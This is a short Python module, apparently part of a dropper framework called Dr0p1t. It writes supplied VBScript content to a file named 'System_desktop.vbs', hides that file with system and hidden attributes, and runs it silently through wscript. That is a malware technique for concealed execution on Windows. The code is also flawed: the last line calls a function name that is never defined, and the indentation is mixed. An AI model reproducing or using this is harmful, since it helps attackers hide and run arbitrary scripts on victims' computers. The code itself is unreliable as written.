#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run vbs scripts
#Start
from os import popen
def create_and_run_vbs(tobe):
    f = open("System_desktop.vbs","w")
    f.write(tobe)
    f.close()
	xxx = popen("attrib +s +h System_desktop.vbs")
    blah = popen( "wscript System_desktop.vbs > nul" )

create_and_run_bat(Vbs_Script_Data)
